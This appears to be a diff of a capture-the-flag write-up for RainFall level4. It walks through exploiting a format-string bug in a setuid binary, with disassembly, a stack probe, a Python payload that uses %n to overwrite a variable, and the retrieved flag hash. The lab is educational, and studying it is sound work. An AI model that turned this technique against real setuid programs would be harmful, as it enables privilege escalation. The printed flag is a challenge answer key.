@@ -1,21 +1,13 @@
-
-  GCC stack protector support:            Enabled
-  Strict user copy checks:                Disabled
-  Restrict /dev/mem access:               Enabled
-  Restrict /dev/kmem access:              Enabled
-  grsecurity / PaX: No GRKERNSEC
-  Kernel Heap Hardening: No KERNHEAP
- System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
-
 level4@RainFall:~$ pwd
 /home/user/level4
+
 level4@RainFall:~$ ls -l
 -rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
+
 level4@RainFall:~$ ./level4
 jahdlfjkhasldkjfhlajksd
 jahdlfjkhasldkjfhlajksd
+
 level4@RainFall:~$ objdump -d level4
 ...
 08048444 <p>:
@@ -60,6 +52,7 @@ level4@RainFall:~$ objdump -d level4
  80484b4:	90                   	nop
  80484b5:	90                   	nop
 ...
+
 ********************************************************************************
 Three functions are defined : main, p, and n.
 We can see that the p function calls printf, which uses the input string readed
@@ -69,10 +62,12 @@ jump directly on the leave instruction of n. But if it is true, then we keep
 going through the code until the system call. It would be useful to know what
 kind of command this system call will launch, just to be sure.
 ********************************************************************************
+
 level4@RainFall:~$ strings level4
 ...
 /bin/cat /home/user/level5/.pass
 ...
+
 ********************************************************************************
 This command is exactly what we need, because it will try to display our flag
 with the right permissions to do so. Now we have to find a way to write the
@@ -84,15 +79,18 @@ we can generate a string that will pop all arguments in the stack, and take the
 %n conversion to write the len the string into m, as its address is given in
 parameter for the %n conversion.
 ********************************************************************************
+
 level4@RainFall:~$ ./level4
 AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
 AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
+
 ********************************************************************************
 We can see that we need to pop 11 elements on the stack to get our format's 4
 first bytes as a parameter. So now we can write the m variable address as the
 four first bytes of our format. We can then adjust the number of bytes written
 by using a padding information into one of our 4 bytes conversion.
 Let's create our payload with python:
+
 -----------------------------exploit_printf.py----------------------------------
 m_addr = '\x10\x98\x04\x08' # Adresse de la variable m (little-endian).
 
@@ -100,11 +98,13 @@ poppers = '%x' * 10 # Conversions chargees de pop les elements de la stack.
 
 print(m_addr + poppers + '%16930052x' + '%n') # Payload finale
 ----------------------------------------------------------------
+
 To calculate the padding, we sum up the number of bytes printed by the current
 format string, then a substraction gives us the final answer.
 0x01025544 == 16930116
 16930116 - 64 == 16930052
 ********************************************************************************
+
 python /tmp/exploit_printf.py | ./level4
 ...
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
